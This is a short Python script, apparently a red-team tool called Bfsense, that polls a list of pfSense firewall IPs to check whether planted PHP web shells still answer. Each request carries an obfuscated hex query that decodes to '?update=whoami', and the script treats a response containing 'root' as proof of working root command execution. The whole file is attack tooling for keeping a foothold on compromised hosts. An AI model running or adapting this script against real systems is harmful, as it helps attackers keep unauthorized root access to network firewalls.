# Github.com/M507/Bfsense

import requests, threading, time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def report():
    """
    This function should report to whatever dashboard the red team has.
    :return:
    """
    pass


def reverse(lst):
    """
    Reversing a list using reverse()
    :param lst:
    :return:
    """
    lst.reverse()
    return lst


def check(URL):
    """
    Check one file
    :param URL:
    :return:
    """
    try:
        # api-endpoint
        txt = "3f7570646174653d77686f616d69"
        URL = URL + ''.join([chr(int(''.join(c), 16)) for c in zip(txt[0::2], txt[1::2])])

        # sending get request and saving the response as response object
        r = requests.get(url=URL, verify=False, timeout=1)
        raw = r.text
        raw = raw.split('\n')[0]
        txt = "726f6f74"

        if ''.join([chr(int(''.join(c), 16)) for c in zip(txt[0::2], txt[1::2])]) in raw:
            return True
    except:
        pass
    return False


def getFiles():
    """
    Get all web files
    :return:
    """
    tmpList = []
    for line in open("files.txt"):
        line = line.strip('\n')
        if "www" in line:
            line = line.split('/')[4]
            if line.endswith('php'):
                tmpList.append(line)
    return reverse(tmpList)


def getIPs():
    """
    Get all ips from ips.txt
    :return:
    """
    tmpList = []
    for line in open("ips.txt"):
        tmpList.append(line.strip('\n'))
    return tmpList


def checkHOST(ip,paths):
    """
    To check a host's status
    :param ip: pfsense ip
    :return:
    """
    # warning flag
    goodIP = 0
    # Debug
    print("Testing " + ip)
    for path in paths:
        URL = "https://" + ip + "/" + path
        if check(URL):
            # Report
            print(ip+" is reporting back")
            goodIP = 1
            break
        print(ip+" is not responding?!")
    if goodIP == 0:
        print("WARNING: you lost " + ip + " !!!!!")


def main():
    """
    Start
    :return:
    """
    ips = getIPs()
    paths = getFiles()
    while True:
        for ip in ips:
            threading.Thread(target=checkHOST, args=(ip,paths)).start()
        time.sleep(20)



if __name__ == '__main__':
    main()
